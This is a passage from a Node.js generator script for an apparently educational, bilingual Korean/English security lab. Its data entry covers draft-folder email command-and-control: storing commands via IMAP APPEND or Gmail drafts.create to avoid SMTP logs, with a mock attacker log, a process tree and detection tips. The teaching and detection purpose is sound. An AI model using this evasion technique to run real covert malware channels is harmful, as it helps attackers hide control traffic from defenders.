          desc:'이메일을 보내지 않고 임시보관함에 명령을 저장합니다. 발신/수신 로그가 남지 않아 탐지가 어렵습니다.',descEn:'Stores commands in the Drafts folder without sending emails. No send/receive logs are generated, making detection difficult.',
          stepTitle:'Draft 기반 C2',stepTitleEn:'Draft-Based C2',
          feynman:'편지를 우체통에 넣지 않고, 공유 사물함에 메모를 남기는 것과 같습니다. 우체국에는 기록이 남지 않습니다.',feynmanEn:'Like leaving a note in a shared locker instead of mailing a letter. No postal records are created.',
          expert:'Draft 기반 C2는 SMTP 로그를 우회합니다. IMAP APPEND 명령으로 Draft 폴더에 직접 저장하면 발신/수신 기록이 없습니다. Gmail API의 drafts.create도 동일한 효과입니다. IMAP 감사 로그에서 APPEND 명령을 탐지해야 합니다.',expertEn:'Draft-based C2 bypasses SMTP logs. IMAP APPEND directly to Drafts creates no send/receive records. Gmail API drafts.create has the same effect. Detect APPEND commands in IMAP audit logs.',
          defTooltip:'IMAP APPEND 명령으로 Draft 폴더에 저장되는 패턴을 모니터링하세요. 특히 비메일 프로세스에서의 Draft 조작은 강력한 C2 지표입니다.',defTooltipEn:'Monitor IMAP APPEND patterns to Draft folders. Draft manipulation from non-mail processes is a strong C2 indicator.',
          hackerLog:{title:'Draft C2',lines:[{text:'APPEND [Gmail]/Drafts',desc:'Draft 폴더에 명령 저장 - SMTP 로그 우회'},{text:'No SMTP logs generated',desc:'발신/수신 로그 없음 - 탐지 극히 어려움'}]},
          terms:[{term:'Draft-Based C2',desc:'이메일 임시보관함을 C2 통신 채널로 사용하는 기법'},{term:'IMAP APPEND',desc:'IMAP 서버의 특정 폴더에 메시지를 직접 추가하는 명령'}]
        }
      ],
      processTree: [
        {name:'python3.exe',depth:0,alert:true,minStep:0},
        {name:'IMAP4_SSL imap.gmail.com:993',depth:1,alert:true,minStep:0},
        {name:'SEARCH SUBJECT task_',depth:2,alert:true,minStep:1},
        {name:'SMTP_SSL smtp.gmail.com:465',depth:1,alert:true,minStep:2},
        {name:'APPEND [Gmail]/Drafts',depth:1,alert:true,minStep:3}
      ]
    }
  },
];

// Write files
techniques.forEach(tech => {
  // Write HTML
  const htmlPath = path.join(eduDir, tech.filename + '.html');
  const html = generateHTML(tech);
  fs.writeFileSync(htmlPath, html, 'utf-8');
  console.log(`[HTML] ${htmlPath}`);

  // Write JSON
  if (tech.lab) {
    const jsonPath = path.join(labDir, tech.lab.id + '.json');
    // Remove lab from tech to avoid circular
    const labData = { ...tech.lab };
    fs.writeFileSync(jsonPath, JSON.stringify(labData, null, 2), 'utf-8');
    console.log(`[JSON] ${jsonPath}`);
  }
});

console.log('\nDone! Generated', techniques.length, 'technique pairs.');
